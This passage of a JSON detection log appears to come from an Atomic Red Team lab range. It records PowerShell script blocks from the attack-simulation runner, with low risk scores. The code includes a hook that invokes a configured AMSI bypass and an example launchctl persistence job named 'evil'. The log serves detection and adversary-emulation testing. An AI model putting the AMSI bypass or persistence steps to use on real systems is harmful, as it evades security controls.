$ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    Write-EventLog  -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0240941+00:00",
      "event_id": 35710863,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 847,
      "full_command": "#requires -Version 5.0\n\n# execute amsi bypass if configured to use one\nif([bool]$artConfig.absb -and ($artConfig.OS -eq \"windows\")){\n    $artConfig.absb.Invoke()\n}\n\n#Get public and private function definition files.\n$Public = @( Get-ChildItem -Path $PSScriptRoot\\Public\\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )\n$Private = @( Get-ChildItem -Path $PSScriptRoot\\Private\\*.ps1 -Recurse -Exclude \"AtomicClassSchema.ps1\" -ErrorAction SilentlyContinue )\n\n# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)\n. \"$PSScriptRoot\\Private\\AtomicClassSchema.ps1\"\n\n#Dot source the files\nForeach ($import in @($Public + $Private)) {\n    Try {\n        . $import.fullname\n    }\n    Catch {\n        Write-Error -Message \"Failed to import function $($import.fullname): $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0842599+00:00",
      "event_id": 35710878,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 7135,
      "full_command": "# Loop through all atomic yaml files to load into list of objects\nfunction Loop($fileList, $atomicType) {\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n\n    $fileList | ForEach-Object {\n        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)\n        if ( $currentTechnique -ne \"index\" ) {\n            $technique = Get-AtomicTechnique -Path $_.FullName\n            if ($technique) {\n                $technique.atomic_tests | ForEach-Object -Process {\n                    $test = New-Object -TypeName psobject\n                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null\n                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name\n                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid\n                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120\n                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value \"\"\n                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType\n                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false\n                    $test | Add-Member -MemberType NoteProperty -Name notes -Value \"\"\n\n                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen\n                    $dummy = $AllAtomicTests.Add(($test))\n                }\n            }\n        }\n    }\n    return $AllAtomicTests\n\n}\n\nfunction Get-NewSchedule() {\n    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {\n        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File\n        $publicAtomics = Loop $publicAtomicFiles \"Public\"\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)\"\n    }\n    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {\n        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File\n        $privateAtomics = Loop $privateAtomicFiles \"Private\"\n    }\n    else {\n        Write-Verbose \"Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)\"\n    }\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}\n    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}\n    return $AllAtomicTests\n}\n\nfunction Get-ScheduleRefresh() {\n    $AllAtomicTests = Get-NewSchedule\n    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)\n\n    # Creating new schedule object for updating changes in atomics\n    $newSchedule = New-Object System.Collections.ArrayList\n\n    # Check if any tests haven't been added to schedule and add them\n    $update = $false\n    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {\n        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }\n        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }\n\n        if (!$old) {\n            $update = $true\n            $newSchedule += $fresh\n        }\n\n        # Updating schedule with changes\n        else {\n            if ($fresh -is [array]) {\n                $fresh = $fresh[0]\n                LogRunnerMsg \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"\n                Write-Host -ForegroundColor Yellow \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"; Start-Sleep 10\n                exit\n            }\n            $old.Technique = $fresh.Technique\n            $old.TestName = $fresh.TestName\n            $old.supported_platforms = $fresh.supported_platforms\n\n            $update = $true\n            $newSchedule += $old\n        }\n\n    }\n    if ($update) {\n        $newSchedule | Export-Csv $artConfig.scheduleFile\n        LogRunnerMsg \"Schedule has been updated with new tests.\"\n    }\n    return $newSchedule\n\n}\n\nfunction Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {\n    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {\n        if ($listOfAtomics) {\n            $schedule = Import-Csv $listOfAtomics\n        }\n        else {\n            $schedule = Import-Csv $artConfig.scheduleFile\n        }\n\n        # Filter schedule to either Active/Supported Platform or TestGuids List\n        if ($TestGuids) {\n            $schedule = $schedule | Where-Object {\n                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)\n            }\n        }\n        else {\n            if ($filterByEnabled -and $filterByPlatform) {\n                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" )) }\n            }\n            elseif ($filterByEnabled) {\n                $schedule = $schedule | Where-Object { $_.enabled -eq $true }\n            }\n            elseif ($filterByPlatform) {\n                $schedule = $schedule | Where-Object { $_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" }\n            }\n        }\n\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'\"\n    }\n\n    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow \"No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)\"; return $null }\n    return $schedule\n}\n\nfunction Invoke-GenerateNewSchedule() {\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null\n\n    LogRunnerMsg \"Generating new schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-NewSchedule\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Schedule written to $($artConfig.scheduleFile)\"\n}\n\nfunction Invoke-RefreshExistingSchedule() {\n    LogRunnerMsg \"Refreshing existing schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-ScheduleRefresh\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Refreshed schedule written to $($artConfig.scheduleFile)\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2617565+00:00",
      "event_id": 35710724,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1000,
      "full_command": "function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {\n    $FailureReasons = New-Object System.Collections.ArrayList\n    if ( $test.executor.elevation_required -and -not $isElevated) {\n        $FailureReasons.add(\"Elevation required but not provided`n\") | Out-Null\n    }\n    foreach ($dep in $test.dependencies) {\n        $executor = Get-PrereqExecutor $test\n        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n        if ($executor -ne \"powershell\") { $final_command = ($final_Command.trim()).Replace(\"`n\", \" && \") }\n        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session\n        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n        if ($res.ExitCode -ne 0) {\n            $FailureReasons.add($description) | Out-Null\n        }\n    }\n    $FailureReasons\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2052268+00:00",
      "event_id": 35710687,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 7135,
      "full_command": "# Loop through all atomic yaml files to load into list of objects\nfunction Loop($fileList, $atomicType) {\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n\n    $fileList | ForEach-Object {\n        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)\n        if ( $currentTechnique -ne \"index\" ) {\n            $technique = Get-AtomicTechnique -Path $_.FullName\n            if ($technique) {\n                $technique.atomic_tests | ForEach-Object -Process {\n                    $test = New-Object -TypeName psobject\n                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null\n                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name\n                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid\n                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join \"|\")\n                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120\n                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value \"\"\n                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType\n                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false\n                    $test | Add-Member -MemberType NoteProperty -Name notes -Value \"\"\n\n                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen\n                    $dummy = $AllAtomicTests.Add(($test))\n                }\n            }\n        }\n    }\n    return $AllAtomicTests\n\n}\n\nfunction Get-NewSchedule() {\n    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {\n        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File\n        $publicAtomics = Loop $publicAtomicFiles \"Public\"\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)\"\n    }\n    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {\n        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File\n        $privateAtomics = Loop $privateAtomicFiles \"Private\"\n    }\n    else {\n        Write-Verbose \"Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)\"\n    }\n    $AllAtomicTests = New-Object System.Collections.ArrayList\n    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}\n    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}\n    return $AllAtomicTests\n}\n\nfunction Get-ScheduleRefresh() {\n    $AllAtomicTests = Get-NewSchedule\n    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)\n\n    # Creating new schedule object for updating changes in atomics\n    $newSchedule = New-Object System.Collections.ArrayList\n\n    # Check if any tests haven't been added to schedule and add them\n    $update = $false\n    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {\n        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }\n        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }\n\n        if (!$old) {\n            $update = $true\n            $newSchedule += $fresh\n        }\n\n        # Updating schedule with changes\n        else {\n            if ($fresh -is [array]) {\n                $fresh = $fresh[0]\n                LogRunnerMsg \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"\n                Write-Host -ForegroundColor Yellow \"Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).\n                            `nCannot Continue Execution. System Exit\"; Start-Sleep 10\n                exit\n            }\n            $old.Technique = $fresh.Technique\n            $old.TestName = $fresh.TestName\n            $old.supported_platforms = $fresh.supported_platforms\n\n            $update = $true\n            $newSchedule += $old\n        }\n\n    }\n    if ($update) {\n        $newSchedule | Export-Csv $artConfig.scheduleFile\n        LogRunnerMsg \"Schedule has been updated with new tests.\"\n    }\n    return $newSchedule\n\n}\n\nfunction Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {\n    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {\n        if ($listOfAtomics) {\n            $schedule = Import-Csv $listOfAtomics\n        }\n        else {\n            $schedule = Import-Csv $artConfig.scheduleFile\n        }\n\n        # Filter schedule to either Active/Supported Platform or TestGuids List\n        if ($TestGuids) {\n            $schedule = $schedule | Where-Object {\n                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)\n            }\n        }\n        else {\n            if ($filterByEnabled -and $filterByPlatform) {\n                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" )) }\n            }\n            elseif ($filterByEnabled) {\n                $schedule = $schedule | Where-Object { $_.enabled -eq $true }\n            }\n            elseif ($filterByPlatform) {\n                $schedule = $schedule | Where-Object { $_.supported_platforms -like \"*\" + $artConfig.OS + \"*\" }\n            }\n        }\n\n    }\n    else {\n        Write-Host -ForegroundColor Yellow \"Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'\"\n    }\n\n    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow \"No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)\"; return $null }\n    return $schedule\n}\n\nfunction Invoke-GenerateNewSchedule() {\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null\n\n    LogRunnerMsg \"Generating new schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-NewSchedule\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Schedule written to $($artConfig.scheduleFile)\"\n}\n\nfunction Invoke-RefreshExistingSchedule() {\n    LogRunnerMsg \"Refreshing existing schedule: $($artConfig.scheduleFile)\"\n    $schedule = Get-ScheduleRefresh\n    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation\n    Write-Host -ForegroundColor Green \"Refreshed schedule written to $($artConfig.scheduleFile)\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0693359+00:00",
      "event_id": 35710869,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 19795,
      "full_command": "filter Get-AtomicTechnique {\n    <#\n    .SYNOPSIS\n\n    Retrieve and validate an atomic technique.\n\n    .DESCRIPTION\n\n    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.\n\n    This function facilitates the following use cases:\n\n    1) Validation prior to execution of atomic tests.\n    2) Writing code to reason over one or more atomic techniques/tests.\n    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.\n    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.\n\n    .PARAMETER Path\n\n    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.\n\n    .PARAMETER Yaml\n\n    Specifies a single string consisting of raw atomic technique YAML.\n\n    .EXAMPLE\n\n    Get-ChildItem -Path C:\\atomic-red-team\\atomics\\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-Item C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml | Get-AtomicTechnique\n\n    .EXAMPLE\n\n    Get-AtomicTechnique -Path C:\\atomic-red-team\\atomics\\T1117\\T1117.yaml\n\n    .EXAMPLE\n\n    $Yaml = @'\n    ---\n    attack_technique: T1152\n    display_name: Launchctl\n\n    atomic_tests:\n    - name: Launchctl\n      description: |\n        Utilize launchctl\n\n      supported_platforms:\n        - macos\n\n      executor:\n        name: sh\n        command: |\n          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n    '@\n\n    Get-AtomicTechnique -Yaml $Yaml\n\n    .INPUTS\n\n    System.IO.FileInfo\n\n    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.\n\n    .OUTPUTS\n\n    AtomicTechnique\n\n    Outputs an object representing a parsed and validated atomic technique.\n    #>\n\n    [CmdletBinding(DefaultParameterSetName = 'FilePath')]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]\n        [String]\n        [Alias('FullName')]\n        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]\n        $Path,\n\n        [Parameter(Mandatory, ParameterSetName = 'Yaml')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Yaml\n    )\n\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'FilePath' {\n            $ResolvedPath = Resolve-Path -Path $Path\n\n            $YamlContent = Get-Content -Path $ResolvedPath -Raw\n            $ErrorStringPrefix = \"[$($ResolvedPath)]\"\n        }\n\n        'Yaml' {\n            $YamlContent = $Yaml\n            $ErrorStringPrefix = ''\n        }\n    }\n\n    $ParsedYaml = $null\n\n    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')\n    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')\n\n    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.\n    # Capture the exception and convert to PowerShell error so that the user can decide\n    # how to handle the error.\n    try {\n        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent\n    }\n    catch {\n        Write-Error $_\n    }\n\n    if ($ParsedYaml) {\n        # The document was well-formed YAML. Now, validate against the atomic red schema\n\n        $AtomicInstance = [AtomicTechnique]::new()\n\n        if (-not $ParsedYaml.Count) {\n            Write-Error \"$ErrorStringPrefix YAML file has no elements.\"\n            return\n        }\n\n        if (-not $ParsedYaml.ContainsKey('attack_technique')) {\n            Write-Error \"$ErrorStringPrefix 'attack_technique' element is required.\"\n            return\n        }\n\n        $AttackTechnique = $null\n\n        if ($ParsedYaml['attack_technique'].Count -gt 1) {\n            # An array of attack techniques are supported.\n            foreach ($Technique in $ParsedYaml['attack_technique']) {\n                if (\"$Technique\" -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n                    Write-Warning \"$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.\"\n                }\n\n                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']\n            }\n        }\n        else {\n            if ((-not \"$($ParsedYaml['attack_technique'])\".StartsWith('T'))) {\n                # If the attack technique is a single entry, validate that it starts with the letter T.\n                Write-Warning \"$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.\"\n            }\n\n            [String] $AttackTechnique = $ParsedYaml['attack_technique']\n        }\n\n        $AtomicInstance.attack_technique = $AttackTechnique\n\n        if (-not $ParsedYaml.ContainsKey('display_name')) {\n            Write-Error \"$ErrorStringPrefix 'display_name' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['display_name'] -is [String])) {\n            Write-Error \"$ErrorStringPrefix 'display_name' must be a string.\"\n            return\n        }\n\n        $AtomicInstance.display_name = $ParsedYaml['display_name']\n\n        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is required.\"\n            return\n        }\n\n        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element must be an array.\"\n            return\n        }\n\n        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)\n\n        if (-not $ParsedYaml['atomic_tests'].Count) {\n            Write-Error \"$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.\"\n            return\n        }\n\n        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {\n            $AtomicTest = $ParsedYaml['atomic_tests'][$i]\n\n            $AtomicTestInstance = [AtomicTest]::new()\n\n            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n            if (-not $AtomicTest.ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.name = $AtomicTest['name']\n            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']\n\n            if (-not $AtomicTest.ContainsKey('description')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['description'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.\"\n                return\n            }\n\n            $AtomicTestInstance.description = $AtomicTest['description']\n\n            if (-not $AtomicTest.ContainsKey('supported_platforms')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.\"\n                return\n            }\n\n            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {\n                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {\n                    Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').\"\n                }\n            }\n\n            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']\n\n            $Dependencies = $null\n\n            if ($AtomicTest['dependencies'].Count) {\n                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)\n                $j = 0\n\n                # dependencies are optional and there can be multiple\n                foreach ($Dependency in $AtomicTest['dependencies']) {\n                    $DependencyInstance = [AtomicDependency]::new()\n\n                    if (-not $Dependency.ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.description = $Dependency['description']\n                    $StringsWithPotentialInputArgs.Add($Dependency['description'])\n\n                    if (-not $Dependency.ContainsKey('prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.prereq_command = $Dependency['prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['prereq_command'])\n\n                    if (-not $Dependency.ContainsKey('get_prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['get_prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])\n\n                    $Dependencies[$j] = $DependencyInstance\n\n                    $j++\n                }\n\n                $AtomicTestInstance.dependencies = $Dependencies\n            }\n\n            if ($AtomicTest.ContainsKey('dependency_executor_name')) {\n                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').\"\n                    return\n                }\n\n                if ($null -eq $AtomicTestInstance.Dependencies) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.\"\n                }\n\n                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']\n            }\n\n            $InputArguments = $null\n\n            # input_arguments is optional\n            if ($AtomicTest.ContainsKey('input_arguments')) {\n                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {\n                    $AtomicTest['input_arguments'].GetType().FullName\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['input_arguments'].Count)) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.\"\n                    return\n                }\n\n                $InputArguments = @{}\n\n                $j = 0\n\n                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {\n\n                    $InputArgument = [AtomicInputArgument]::new()\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.\"\n                        return\n                    }\n\n                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.\"\n                        return\n                    }\n\n                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['type']) {\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')\"\n                    }\n\n                    $InputArgument.type = 